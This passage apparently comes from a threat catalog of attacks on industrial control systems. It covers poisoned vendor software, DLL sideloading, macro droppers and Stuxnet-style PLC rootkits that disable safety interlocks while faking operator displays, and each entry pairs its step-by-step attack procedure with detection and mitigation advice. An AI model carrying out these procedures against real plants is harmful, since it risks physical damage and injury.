- **Attack Steps**: Step 1: Attacker identifies unsigned driver DLL dependency (e.g., plcdriver.dll).Step 2: Creates proxy DLL that forwards real calls but logs them to a local file (Tool: DLL Proxy Generator).Step 3: Replaces DLL in SDK’s bin/ folder (Tool: PE Explorer).Step 4: Repackages and rehosts SDK zip on fake vendor support page.Step 5: Engineer installs SDK and builds PLC interface app.Step 6: Every PLC command sent is logged and exfiltrated by scheduled script.
- **Detection**: Monitor unusual disk I/O from DLLs
- **Solution**: Use trusted SDK sources only; checksum validation
- **Tags**: SDK, DLLHijack, InstructionLogger

## Rogue Vendor Chrome Extension for Remote Access

- **Attack Type**: Supply Chain / Browser Plugin Abuse
- **Target**: Web-Based HMI Interface
- **Vulnerability**: No extension vetting, social engineering
- **MITRE**: T1176 + T1087.002
- **Impact**: Credential theft, unauthorized login
- **Tools**: Chrome Dev Tools, JavaScript, Firebase
- **Scenario**: A browser extension published by a “vendor support team” performs SCADA panel access logging and exfiltration.
- **Attack Steps**: Step 1: Attacker develops Chrome extension mimicking vendor remote access helper.Step 2: Code captures all URLs, credentials, and input into SCADA web HMI panels (Tool: JavaScript fetch() and localStorage).Step 3: Publishes it to Chrome Web Store with vendor logo.Step 4: ICS operator installs it on browser for HMI troubleshooting.Step 5: Extension logs credentials and sessions, sends them to Firebase DB.Step 6: Attacker reuses credentials to control remote HMI.
- **Detection**: Audit browser extensions, monitor DOM hooks
- **Solution**: Only use extensions signed and reviewed by vendors
- **Tags**: ChromeExt, CredentialLeak, BrowserAbuse

## Vendor Chat Support Live Assistance Malware Drop

- **Attack Type**: Supply Chain / Human-Led Malware Drop
- **Target**: ICS Admin Laptop
- **Vulnerability**: Human trust in vendor communication
- **MITRE**: T1566.002 + T1059.003
- **Impact**: Remote takeover of ICS laptop
- **Tools**: Gophish, Discord API, Netcat
- **Scenario**: Attacker impersonates live vendor support, shares malware disguised as troubleshooting patch during live chat.
- **Attack Steps**: Step 1: Attacker sets up fake vendor live chat page via Discord/Telegram API embedding (Tool: Discord webhooks).Step 2: Social engineers ICS admin to enter the site and initiate a session.Step 3: After brief chat, provides "hotfix" ZIP file.Step 4: User runs executable within, which installs a persistent C2 beacon (Tool: Netcat, schtasks).Step 5: Remote access is maintained via reverse shell.Step 6: Attacker explores SCADA file directories and credentials.
- **Detection**: Monitor download sources, restrict .exe via GPO
- **Solution**: Vendor support whitelisting, zero-trust sessions
- **Tags**: ChatSupport, SocialEng, LiveDrop

## Poisoned Licensing Server IP Redirection

- **Attack Type**: Supply Chain / Licensing Backdoor
- **Target**: SDK Licensing Tool
- **Vulnerability**: License validation not secured
- **MITRE**: T1071.001 + T1203
- **Impact**: Malware activation during license validation
- **Tools**: Hosts File Editor, DNS Server, Wireshark
- **Scenario**: Attacker changes the license validation server address inside vendor config to redirect to a rogue server serving backdoored licenses.
- **Attack Steps**: Step 1: Attacker accesses vendor SDK license config and changes IP to attacker’s domain.Step 2: Builds SDK package and uploads it to partner distribution portal.Step 3: ICS engineers install SDK and validate license using default config.Step 4: Licensing server responds with payload activation (Tool: fake server built with Flask + JSON payload).Step 5: License validation triggers silent script execution using PowerShell.Step 6: Reverse shell or malware runs silently in background.
- **Detection**: Monitor unusual license IP access
- **Solution**: Use TLS-secured licensing servers
- **Tags**: Licensing, ConfigRedir, SDKBackdoor

## Vendor Patch Installer with Visual Scripting Abuse

- **Attack Type**: Supply Chain / GUI Exploitation
- **Target**: SCADA Patch System
- **Vulnerability**: Scripting tied to GUI elements
- **MITRE**: T1569.002 + T1216
- **Impact**: Malware hidden behind user interaction
- **Tools**: Visual Studio, PowerShell ISE, GUI Scripting Engine
- **Scenario**: A patch installer includes GUI-based visual script block that launches malicious child processes on SCADA servers.
- **Attack Steps**: Step 1: Attacker embeds PowerShell command chain into GUI button events using vendor's visual editor (Tool: GUI Builder + PowerShell ISE).Step 2: Builds .exe installer with attractive UI showing update steps.Step 3: Vendor or partner uploads it to support site.Step 4: ICS admin runs installer assuming it's a patch.Step 5: On GUI load, embedded PowerShell launches malware in background.Step 6: Attackers gain long-term access to system.
- **Detection**: Monitor GUI process chains
- **Solution**: Review GUI automation scripts and limit privileges
- **Tags**: GUIExploit, InstallerAbuse, VisualScript

## Tampered Default Passwords List in Vendor Manuals

- **Attack Type**: Supply Chain / Documentation Exploit
- **Target**: Field Device / Operator Workstation
- **Vulnerability**: Trust in vendor documentation
- **MITRE**: T1556.001
- **Impact**: Credential collection via documentation
- **Tools**: PDF Editor, Phishing Toolkit, Credential Harvesters
- **Scenario**: Malicious actor modifies vendor manual PDF to list attacker-controlled systems with default login credentials for testing.
- **Attack Steps**: Step 1: Attacker edits vendor installation guide PDF and inserts false default IP + credentials for test panel (Tool: PDF Editor).Step 2: Uploads to fake vendor forum with high SEO ranking.Step 3: Field technician sets up SCADA test panel using fake config.Step 4: Login connects to attacker’s fake HMI panel, logs all credentials entered.Step 5: Credentials harvested reused for internal SCADA panel access.Step 6: Further lateral movement into ICS zone.
- **Detection**: Validate IPs and credentials during setup
- **Solution**: Provide manuals only via official vendor portals
- **Tags**: PDFManual, DocAttack, ConfigTrap

## Poisoned Vendor Plugin with DLL Sideloading

- **Attack Type**: Supply Chain / DLL Sideload
- **Target**: SCADA Dashboard
- **Vulnerability**: Unsigned DLL sideload path
- **MITRE**: T1574.002
- **Impact**: Code execution on plugin load
- **Tools**: CFF Explorer, DLL Proxy Tool, Process Hacker
- **Scenario**: Vendor plugin includes DLL that loads malicious sqlite3.dll from same directory, enabling sideloaded payload execution.
- **Attack Steps**: Step 1: Attacker modifies plugin binary to call local sqlite3.dll for logging.Step 2: Places malicious sqlite3.dll in plugin folder that opens reverse shell (Tool: DLL Proxy Tool, msfvenom).Step 3: Repackages plugin and distributes via vendor’s plugin marketplace.Step 4: Engineer loads plugin into SCADA dashboard.Step 5: DLL is executed automatically, triggering attacker’s payload.Step 6: Access gained with plugin-level privileges.
- **Detection**: Monitor plugin directories for DLLs
- **Solution**: Use signed DLLs, restrict directory DLL calls
- **Tags**: Plugin, Sideload, DLLAttack

## Compromised Vendor ISO with Encrypted Ransom Module

- **Attack Type**: Supply Chain / Encrypted Payloads
- **Target**: SCADA OS Image
- **Vulnerability**: Encrypted payload hidden in trusted media
- **MITRE**: T1486 + T1027
- **Impact**: Encrypted, delayed ransomware payload
- **Tools**: 7-Zip, Crypto++ Library, VeraCrypt
- **Scenario**: Vendor’s ISO image contains a file that decrypts and runs ransomware module based on system fingerprint.
- **Attack Steps**: Step 1: Attacker inserts encrypted binary into ISO build (Tool: VeraCrypt).Step 2: Modifies startup script to fingerprint system and decrypt if match found (Tool: Crypto++ or Python AES decryptor).Step 3: Victim installs SCADA system and boot scripts trigger conditionally.Step 4: Decrypted ransomware encrypts config files, demands payment.Step 5: System rendered non-functional until ransom paid.Step 6: Incident spreads to backups.
- **Detection**: Monitor conditional execution during boot
- **Solution**: Validate ISO using multi-stage static analysis
- **Tags**: ISO, EncryptedPayload, ConditionalRansom

## Vendor Browser Plugin for XML Parser Injection

- **Attack Type**: Supply Chain / XML Injection
- **Target**: Browser Plugin / Web SCADA
- **Vulnerability**: No protection against XXE
- **MITRE**: T1220 + T1609
- **Impact**: Data leakage via plugin misconfig
- **Tools**: Burp Suite, XML External Entity (XXE) Payloads
- **Scenario**: A browser extension for SCADA web panels mishandles XML configs and allows external XML injection by attacker.
- **Attack Steps**: Step 1: Attacker identifies SCADA browser plugin that parses panel_config.xml files.Step 2: Crafts XML with external entity references pointing to internal files (Tool: Burp Suite, crafted XXE payload).Step 3: User loads XML into browser HMI.Step 4: Plugin parses XML and leaks sensitive data like password file over HTTP.Step 5: Attacker captures the response on attacker-controlled server.Step 6: Internal information used for credential stuffing.
- **Detection**: Scan plugin XML parsers, test with XXE
- **Solution**: Harden parser configs, disallow external entities
- **Tags**: XML, XXE, PluginLeak, Browser

## Compromised Vendor Mobile App for Remote SCADA Access

- **Attack Type**: Supply Chain / Mobile App Backdoor
- **Target**: Mobile SCADA App
- **Vulnerability**: App tampering, lack of app signature validation
- **MITRE**: T1636 + T1071.001
- **Impact**: Full credential compromise, remote system control
- **Tools**: Apktool, Android Studio, Burp Suite, Frida
- **Scenario**: A SCADA vendor’s official Android app is repackaged by an attacker to include malware that records remote user credentials and sends them to a C2 server.
- **Attack Steps**: Step 1: Attacker downloads legitimate vendor SCADA mobile app .apk (Tool: Apktool).Step 2: Decompiles app and injects code to log credentials entered into the login form (Tool: Android Studio, Frida).Step 3: Recompiles and signs app with new certificate (Tool: keytool, jarsigner).Step 4: Uploads modified .apk to phishing page mimicking Google Play or vendor app store.Step 5: Engineer installs app on personal device for remote SCADA monitoring.Step 6: Credentials are logged and sent via HTTPS to attacker's command server (Tool: Burp Suite to intercept and observe traffic).
- **Detection**: Monitor outbound HTTPS to unknown IPs, verify app hash
- **Solution**: Only install vendor-signed apps from verified stores
- **Tags**: MobileBackdoor, Android, AppTamper

## Poisoned Virtual PLC Emulator Distributed via Vendor Forum

- **Attack Type**: Supply Chain / Emulator Exploit
- **Target**: Virtual PLC Emulator
- **Vulnerability**: Community download trust abuse
- **MITRE**: T1056.001 + T1046
- **Impact**: Stealth data theft via development tools
- **Tools**: C++ Compiler, Process Hacker, netstat
- **Scenario**: An attacker modifies a publicly shared virtual PLC emulator distributed via vendor forums to embed a keylogger and backdoor.
- **Attack Steps**: Step 1: Attacker clones open-source PLC emulator source from vendor forum.Step 2: Adds hidden keylogger module and backdoor listening on high port (Tool: C++, ProcessHacker).Step 3: Compiles binary and re-uploads as "PLC Emulator v2 - official update".Step 4: ICS engineer installs emulator to simulate logic before live deployment.Step 5: Emulator logs all keyboard inputs and forwards them to attacker using custom socket module (Tool: netcat, Python server).Step 6: Attacker collects internal IPs, file paths, and user credentials.
- **Detection**: Monitor emulator behavior, scan for keyloggers
- **Solution**: Use hash-verified emulator builds only
- **Tags**: Emulator, Keylogger, Backdoor, Simulation

## Infected Excel Template from Vendor's ICS Reporting Suite

- **Attack Type**: Supply Chain / Office Macro Exploit
- **Target**: ICS Reporting Workstation
- **Vulnerability**: Trust in embedded office templates
- **MITRE**: T1059.005 + T1204.002
- **Impact**: Full system compromise through reporting chain
- **Tools**: Excel VBA Editor, mshta, PowerShell, C2 Server
- **Scenario**: An ICS reporting suite ships with an Excel template that contains malicious macros triggered on opening the file.
- **Attack Steps**: Step 1: Attacker injects malicious VBA macro into Excel template used for ICS event reports (Tool: Excel VBA Editor).Step 2: Macro uses mshta.exe to download and run a script payload from remote server (Tool: mshta, PowerShell).Step 3: Replaces original template in ICS report suite .zip file.Step 4: ICS operator opens the template and enables macros.Step 5: Macro triggers hidden background process establishing reverse shell (Tool: C2 listener on attacker's server).Step 6: Attacker gains persistent access and monitors ICS reports.
- **Detection**: Monitor Office macro execution, restrict mshta
- **Solution**: Enforce macro signing and disable scripting tools
- **Tags**: Excel, VBA, OfficeAttack, Reporting

## Vendor Remote Update Tool Injected with Scheduled Task Creator

- **Attack Type**: Supply Chain / Remote Tool Backdoor
- **Target**: Remote Update Tool
- **Vulnerability**: Scheduled task abuse via vendor utility
- **MITRE**: T1053.005 + T1204.002
- **Impact**: Persistent midnight access to ICS segment
- **Tools**: Visual Studio, Task Scheduler, C2 Beacon Tool
- **Scenario**: Vendor's remote update delivery tool is tampered with and recompiled to schedule a hidden task executing reverse shell every night.
- **Attack Steps**: Step 1: Attacker extracts source of vendor's update distribution tool (Tool: dnSpy or .NET Reflector).Step 2: Injects code that creates scheduled task running C2 beacon daily at midnight (Tool: schtasks, Visual Studio).Step 3: Recompiles and re-signs tool, posts to vendor mirror download page.Step 4: ICS admins install the tool to update multiple remote SCADA devices.Step 5: Task runs silently, connects to attacker's server and maintains shell.Step 6: Attacker pivots to connected RTUs and PLCs.
- **Detection**: Monitor task creation and execution
- **Solution**: Validate tool hash, restrict update tools to local-only
- **Tags**: ScheduledTask, RemoteToolBackdoor

## Vendor Documentation PDF with Embedded Command Execution

- **Attack Type**: Supply Chain / Embedded Script Exploit
- **Target**: ICS Engineering Station
- **Vulnerability**: Trusted file format misused for execution
- **MITRE**: T1203 + T1204.001
- **Impact**: Covert compromise via documentation interaction
- **Tools**: EvilPDF, JavaScript Payloads, PDF Debugger
- **Scenario**: A vendor’s configuration guide PDF is embedded with clickable links that trigger system-level commands using vulnerable PDF readers.
- **Attack Steps**: Step 1: Attacker uses EvilPDF to craft documentation PDF with embedded JavaScript trigger (Tool: EvilPDF, JavaScript runner).Step 2: Payload executes cmd.exe /c powershell -EncodedCommand when clicked.Step 3: Distributes the PDF on vendor documentation mirror or support forums.Step 4: ICS operator reads doc and clicks "Run AutoConfig" button.Step 5: Hidden script downloads and executes payload in background.Step 6: Attacker gains stealth access to engineering workstation.
- **Detection**: Alert on suspicious process spawned from PDF
- **Solution**: Use hardened PDF viewers; no JavaScript execution
- **Tags**: PDF, CommandExecution, DocumentationExploit

## Covert PLC Logic Injection via USB Drop

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC, Engineering Workstation
- **Vulnerability**: Human error (USB use), PLC firmware trust, STEP7 injection
- **MITRE**: T0859 (Modify Control Logic), T0802 (Spearphishing via Removable Media)
- **Impact**: Sabotage of physical process (e.g., centrifuge spin rate)
- **Tools**: Custom rootkit (Stuxnet-style), USB payload, STEP7 (Siemens), Procmon
- **Scenario**: Attacker places an infected USB in a control room to install a rootkit on engineering workstation, which uploads stealthy logic to a PLC.
- **Attack Steps**: Step 1: Prepare USB with custom Stuxnet-like rootkit payload targeting Siemens STEP7 software.Step 2: Drop USB inside the engineering room, near operator terminal.Step 3: Engineer unknowingly inserts USB and opens project file.Step 4: Payload auto-executes, injecting DLLs into STEP7 process.Step 5: Rootkit modifies compiled logic during upload to PLC (e.g., logic to spin centrifuge faster every 10 mins).Step 6: Original display in HMI remains unchanged — logic is hidden.Step 7: Payload cleans traces and persists via registry.Step 8: PLC now behaves anomalously but looks normal on monitoring.
- **Detection**: Analyze differences between compiled and uploaded code; monitor registry keys and USB usage
- **Solution**: Enforce USB blocking, isolate engineering station, use signed PLC code
- **Tags**: stuxnet, usb, plc-rootkit, code injection

## HMI Display Spoofing While PLC Malfunctions

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC, HMI
- **Vulnerability**: Lack of authentication in HMI-PLC comms
- **MITRE**: T0859, T0813 (Manipulation of View)
- **Impact**: Physical damage masked by false feedback
- **Tools**: TwinCAT PLC, Custom Payload Injector, Wireshark
- **Scenario**: Rootkit modifies PLC logic while simultaneously modifying HMI tags to show fake normal values, fooling operators.
- **Attack Steps**: Step 1: Attacker gains access to engineering workstation remotely or physically.Step 2: Installs HMI tag rewriter and PLC logic rootkit.Step 3: Rootkit alters logic to reverse valve commands (e.g., open becomes close).Step 4: HMI tag values are spoofed via memory manipulation or OPC tag hijacking.Step 5: Operators see all systems functioning normally.Step 6: Physical plant behavior diverges (e.g., cooling fails).Step 7: Rootkit has auto-restore logic if reboot is detected.Step 8: Logs are overwritten or altered before saving.
- **Detection**: Analyze OPC/HMI tag integrity and cross-check physical sensor readings
- **Solution**: Use unspoofable sensors; log independent out-of-band sensor data
- **Tags**: hmi-spoof, plc-logic-alter, deception

## Rootkit via Remote Engineering Workstation Hijack

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC, Engineering Workstation
- **Vulnerability**: Lack of code signing in PLC uploads
- **MITRE**: T0859, T0851 (Remote Access Software)
- **Impact**: Sabotage with minimal forensic visibility
- **Tools**: Cobalt Strike, EvilGrade, Custom STEP7 Hook
- **Scenario**: A remote attacker compromises an engineering workstation via phishing and injects a PLC logic-hijacking rootkit.
- **Attack Steps**: Step 1: Attacker sends phishing email with malicious payload targeting control engineer.Step 2: Engineer clicks and malware installs backdoor.Step 3: Attacker waits for engineer to connect to PLC via STEP7.Step 4: Malware hooks STEP7 and silently injects custom ladder logic before upload.Step 5: Modifies cyclic OB (organization blocks) to introduce delays or trigger logic.Step 6: Engineer sees original code, unaware of changes.Step 7: Attacker monitors logs and reuploads if overwritten.Step 8: PLC behaves incorrectly but visibly looks fine.
- **Detection**: Monitor STEP7 behavior and compare uploaded vs. original logic
- **Solution**: Require dual-approval for PLC code uploads; enforce signed code only
- **Tags**: rootkit, phishing, plc, ladder-logic-injection

## PLC Rootkit with Watchdog Timer Abuse

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC, Safety PLC
- **Vulnerability**: Time-based logic triggers, watchdog misuse
- **MITRE**: T0859, T0804 (Scheduled Task)
- **Impact**: Safety interlocks bypassed selectively
- **Tools**: PLC Firmware Toolkit, Wireshark, Custom SABOTAGE ladder logic
- **Scenario**: Attack modifies watchdog timers in the PLC to randomly reset or execute sabotage logic only at specific conditions.
- **Attack Steps**: Step 1: Attacker injects malicious logic using engineering workstation (via social engineering or RDP hijack).Step 2: Uploads malicious OB with logic tied to system time or watchdog flag.Step 3: Logic runs only if temperature exceeds threshold + time is within 3:00–3:05 AM.Step 4: PLC watchdog timer silently disables safety interlock during this time.Step 5: Rest of the time PLC behaves normally.Step 6: HMI and logs show normal values — watchdog flags hidden.Step 7: Physical damage (e.g., overheat, pressure breach) occurs in targeted window.Step 8: Logic resets to clean state post sabotage, leaving no evidence.
- **Detection**: Analyze OB behavior and schedule logic; monitor for unusual time-based logic
- **Solution**: Lock watchdog config, use redundant sensors not programmable from same logic
- **Tags**: rootkit, watchdog, plc-sabotage

## Compromising PLC via Infected Vendor Update

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Supply chain trust violation
- **MITRE**: T0859, T0805 (Supply Chain Compromise)
- **Impact**: Widespread propagation of PLC sabotage code
- **Tools**: Malicious firmware patch, Repackaged Siemens installer, Ghidra
- **Scenario**: Attacker poisons a vendor’s PLC firmware update utility, spreading PLC rootkit during routine maintenance.
- **Attack Steps**: Step 1: Attacker compromises vendor's update server or USB distribution channel.Step 2: Replaces original installer with repackaged malicious firmware loader.Step 3: Vendor technician installs firmware using compromised tool.Step 4: Hidden rootkit injected into PLC logic memory or firmware.Step 5: Rootkit triggers logic alteration during specific process condition.Step 6: Update utility shows successful installation with fake checksum.Step 7: Logs on PLC appear valid; no alert shown.Step 8: Logic backdoor allows remote trigger by specific crafted Modbus packet.
- **Detection**: Verify firmware hashes against offline signed repository; isolate update devices
- **Solution**: Use hardware-based validation for PLC updates; enforce vendor verification
- **Tags**: stuxnet, supply-chain, firmware

## Ladder Logic Injection with Comment Spoofing

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC, Engineering Station
- **Vulnerability**: Trust in human-readable comments
- **MITRE**: T0859, T0806
- **Impact**: Safety processes bypassed
- **Tools**: TIA Portal, Ghidra, Custom STEP7 Hook
- **Scenario**: Attacker modifies ladder logic in a way that the comments mislead engineers reviewing code visually.
- **Attack Steps**: Step 1: Attacker gains access to engineering workstation using remote access tool (e.g., [AnyDesk]).Step 2: Loads the target PLC program in [TIA Portal].Step 3: Alters ladder logic to reverse safety interlocks while inserting misleading comments like "safety check OK".Step 4: Compiles the project and uploads it to the PLC.Step 5: Uses [Ghidra] to ensure no checksum alerts or signature mismatch appears.Step 6: Restarts the engineering workstation to clear traces of changes.Step 7: Operator checks logic visually and sees misleading comments indicating safe logic.Step 8: Rootkit executes altered logic without triggering alert.
- **Detection**: Audit compiled logic binary, not comments; hash comparison
- **Solution**: Enforce comment-free logic or separate logic audit tool
- **Tags**: logic-spoof, ladder-comment, stuxnet

## Rootkit with DLL Sideloading in PLC Programming Suite

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: Engineering Station, PLC
- **Vulnerability**: DLL sideloading due to path search order
- **MITRE**: T1574.001 (DLL Search Order Hijacking), T0859
- **Impact**: Malicious logic installed without alert
- **Tools**: Process Monitor, Custom DLL Injector, TIA Portal
- **Scenario**: Attacker abuses DLL sideloading flaw in Siemens software to hook logic upload process.
- **Attack Steps**: Step 1: Attacker prepares malicious DLL mimicking a library used by [TIA Portal] (e.g., siemenslib.dll).Step 2: Places DLL in same directory as PLC project folder on engineer’s PC.Step 3: Uses [Process Monitor] to identify DLL loading sequence.Step 4: DLL gets loaded instead of original when engineer opens project.Step 5: DLL hooks into logic upload and modifies ladder logic silently before hitting the PLC.Step 6: Engineer sees normal logic in TIA Portal, unaware it differs on PLC.Step 7: Logs are left untouched, and DLL cleans itself after job.Step 8: Rootkit logic remains until reupload is done with a clean PC.
- **Detection**: Monitor DLL paths with Sysinternals; verify integrity
- **Solution**: Only run programming software from signed folders
- **Tags**: dll-hijack, sideloading, step7-hook

## Rootkit Embedded in Backup PLC Project File

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC, USB
- **Vulnerability**: Trust in backups, hidden logic in projects
- **MITRE**: T0859, T1204
- **Impact**: Logic-based sabotage
- **Tools**: Custom STEP7-Logic Injector, ZIP File Spoofer, Autorun Exploit Tool
- **Scenario**: A fake PLC backup shared via USB/Email contains embedded malicious logic that auto-executes when opened.
- **Attack Steps**: Step 1: Attacker downloads a legit backup of a PLC project and embeds logic changes using [Custom STEP7-Injector].Step 2: Adds fake HMI display mappings to show normal values.Step 3: Uses [ZIP File Spoofer] to compress the project with misleading metadata.Step 4: Sends it to engineers via USB drop or email with label “Latest Backup - Use This”.Step 5: Engineer opens it with STEP7.Step 6: When uploaded to the PLC, injected logic gets activated silently.Step 7: PLC performs harmful actions under normal HMI display.Step 8: Logic reverts on scheduled timer to bypass inspection.
- **Detection**: Compare restored logic with compiled version; file integrity check
- **Solution**: Use backup from signed version control systems only
- **Tags**: backup-injection, plc-project-abuse

## Intermittent Fault Injection using System Clock

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Time-triggered conditional logic
- **MITRE**: T0859, T0804
- **Impact**: Intermittent process disruption
- **Tools**: TIA Portal, Wireshark, PLCsim
- **Scenario**: Logic is modified to inject random faults tied to system clock to make incident hard to trace.
- **Attack Steps**: Step 1: Attacker compromises engineer laptop using phishing and deploys remote backdoor.Step 2: Opens project in [TIA Portal] and adds logic that checks system clock.Step 3: Modifies OB1 to shut off valves for 4 seconds every 3 hours (between :15 and :20 past the hour).Step 4: Uses [PLCsim] to test this behavior in sandbox before upload.Step 5: Engineer uploads project to PLC unaware of the embedded time-based logic.Step 6: Logic executes intermittently — creates random-looking faults in operation.Step 7: Wireshark captures appear normal due to brief fault durations.Step 8: Logs are not recorded due to short execution windows.
- **Detection**: Time-based logic anomaly detection; cross-check uptime vs downtime
- **Solution**: Implement logic behavior monitoring agents
- **Tags**: time-triggered, plc-fault-randomization

## Rootkit via Compromised OPC Server

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC, OPC Server
- **Vulnerability**: OPC write access used as pivot
- **MITRE**: T0859, T0860
- **Impact**: Process control hijack
- **Tools**: Prosys OPC UA, SharpOPC, Cobalt Strike
- **Scenario**: Rootkit abuses an OPC server as a pivot point to upload logic to PLCs in a trusted zone.
- **Attack Steps**: Step 1: Attacker gains access to HMI subnet and finds exposed OPC UA server.Step 2: Uses [Prosys OPC UA Client] to enumerate PLC endpoints.Step 3: Deploys [Cobalt Strike] payload via HMI terminal to escalate privileges.Step 4: Uses [SharpOPC] to interact with OPC server to send logic changes to PLC.Step 5: Injects new logic OB with payload to override motor speed under certain loads.Step 6: HMI still reflects original values due to OPC value spoofing.Step 7: Changes persist silently.Step 8: OPC logs cleared using cleanup script.
- **Detection**: Audit OPC write permissions; segregate OPC and control traffic
- **Solution**: Use OPC firewall, deploy write-only whitelists
- **Tags**: opc-rootkit, pivot-abuse

## Infected Firmware Update USB with Multi-Stage Dropper

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Firmware integrity bypass
- **MITRE**: T0805, T0859
- **Impact**: Stealthy logic embedded in firmware
- **Tools**: USB Rubber Ducky, Modified Firmware Updater, Firmware Debug Tool
- **Scenario**: Multi-stage dropper on USB updates firmware but installs hidden rootkit alongside.
- **Attack Steps**: Step 1: Attacker prepares [USB Rubber Ducky] containing malicious firmware + rootkit loader.Step 2: USB is dropped at vendor office with label “URGENT PATCH”.Step 3: Technician inserts USB and runs the patch tool.Step 4: First stage updates firmware; second stage copies rootkit payload.Step 5: Rootkit logic is written to hidden flash region using [Firmware Debug Tool].Step 6: It activates only when safety condition is met (e.g., pump overheat).Step 7: Tool fakes checksum and completion messages.Step 8: USB self-destructs loader after 5 minutes.
- **Detection**: Check firmware hash from external source; verify USB usage
- **Solution**: Never use non-vendor USBs; air-gap firmware updates
- **Tags**: firmware-rootkit, usb-dropper

## Rootkit That Triggers via SCADA Sensor Value

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Sensor-triggered logic execution
- **MITRE**: T0859, T0833
- **Impact**: Sabotage that hides behind sensor logic
- **Tools**: PLCsim Advanced, Analog Sensor Emulator, Ladder Injector
- **Scenario**: Logic waits for a specific analog sensor value (e.g., pressure = 90 PSI) to activate payload.
- **Attack Steps**: Step 1: Attacker injects logic into OB1 using [Ladder Injector] via TIA Portal.Step 2: Adds conditional block: "If pressure = 90 PSI → disable interlock + close valve."Step 3: Tests it in [PLCsim Advanced] by simulating analog sensor input.Step 4: Uploads logic to PLC.Step 5: PLC behaves normally until 90 PSI is reached.Step 6: Then, triggers malicious action and reverts logic.Step 7: Makes event hard to reproduce during testing.Step 8: Logs manipulated to show manual operator override.
- **Detection**: Sensor data correlation, anomaly detection
- **Solution**: Use hardware-triggered safety overrides
- **Tags**: sensor-logic, condition-triggered-rootkit

## Ladder Logic That Alters HMI Tag Values in Runtime

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC, HMI
- **Vulnerability**: Memory manipulation in runtime
- **MITRE**: T0859, T0813
- **Impact**: Faked process visibility
- **Tools**: TIA Portal, HMI Simulator, OPC Tag Editor
- **Scenario**: Attacker alters HMI values via PLC memory blocks to show incorrect process readings.
- **Attack Steps**: Step 1: Injects logic into PLC that rewrites memory blocks linked to OPC tags.Step 2: Uses [HMI Simulator] to test tag mapping.Step 3: On condition (e.g., temp > 50°C), injects false tag values into buffer.Step 4: Uses [OPC Tag Editor] to confirm values reaching HMI appear normal.Step 5: Meanwhile, real system may be overheating.Step 6: Engineers trust HMI readings and take no action.Step 7: Event logs in HMI show "Nominal Operation".Step 8: Rootkit cleans up on PLC reboot.
- **Detection**: Use raw sensor validation; read-only tags
- **Solution**: Do not allow writable memory for display tags
- **Tags**: hmi-fake, memory-rootkit

## Stuxnet-Style Propagation via Engineering Network

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: Engineering Workstation, PLC
- **Vulnerability**: Shared folders with no auth, reused projects
- **MITRE**: T0859, T1210
- **Impact**: Lateral rootkit spread via human operation
- **Tools**: Responder, Mimikatz, NetShare Scanner
- **Scenario**: Rootkit propagates through Windows network shares used by engineering team.
- **Attack Steps**: Step 1: Compromise one workstation via phishing + [Mimikatz] to extract credentials.Step 2: Uses [NetShare Scanner] to locate shared STEP7 project folders.Step 3: Modifies projects with hidden logic.Step 4: Uses [Responder] to harvest more credentials via LLMNR spoofing.Step 5: Waits for another engineer to open infected project and upload logic.Step 6: Repeat spread across other stations silently.Step 7: Logic contains logic bombs activated at defined sensor states.Step 8: No malware persists on disk — only infected project files.
- **Detection**: Disable network shares for control systems
- **Solution**: Centralized code repository with version control
- **Tags**: worm-style, stuxnet-propagation

## PLC Rootkit Triggered via Malformed Modbus Frame

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Hidden listener logic, Modbus vulnerability
- **MITRE**: T0859, T0860
- **Impact**: Logic control hijack via network
- **Tools**: Modbus Fuzzer, Wireshark, Malicious OB Builder
- **Scenario**: Logic backdoor listens for special malformed Modbus frame to activate payload.
- **Attack Steps**: Step 1: Engineer uploads logic with hidden OB monitoring Modbus port.Step 2: Attacker sends malformed Modbus frame using [Modbus Fuzzer].Step 3: PLC rootkit detects malformed header with specific hex signature.Step 4: Triggers switch in logic memory that disables safety valves.Step 5: PLC resumes normal operation immediately after 10 seconds.Step 6: [Wireshark] logs show corrupted packet, but not decoded properly.Step 7: Engineer inspecting logic sees no trace of fault.Step 8: Payload only activates again on same crafted Modbus trigger.
- **Detection**: Monitor Modbus anomalies, decode malformed packets
- **Solution**: Deep Modbus protocol inspection tools
- **Tags**: modbus-trigger, malformed-frame

## PLC Rootkit Hidden in Firmware Restore Utility

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Trust in firmware tools
- **MITRE**: T0859, T0805
- **Impact**: Long-term persistence across firmware resets
- **Tools**: Modified Restore Tool, PLC Firmware Editor, HashChecker
- **Scenario**: Attacker poisons an official firmware restore tool, embedding logic that gets executed during PLC recovery process.
- **Attack Steps**: Step 1: Attacker obtains official firmware restore utility used for Siemens S7 series.Step 2: Uses [PLC Firmware Editor] to embed malicious logic into recovery image (e.g., adds cyclic code to pulse output unexpectedly).Step 3: Modifies UI of the tool to hide warning messages.Step 4: Runs [HashChecker] to spoof SHA256 hash displayed during restore.Step 5: Uploads fake firmware tool on infected USB or sends via email to maintenance team.Step 6: Technician unknowingly uses tool during a factory reset of a PLC.Step 7: Malicious logic becomes part of default firmware.Step 8: PLC performs sabotage under specific input conditions.
- **Detection**: Firmware behavior baseline, separate integrity verification
- **Solution**: Only use validated tools from offline sources
- **Tags**: firmware-backdoor, tool-poisoning

## Rootkit Triggered by Operator Login Credentials

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC + HMI
- **Vulnerability**: User-specific logic execution
- **MITRE**: T0859, T1078
- **Impact**: Sabotage tied to user behavior
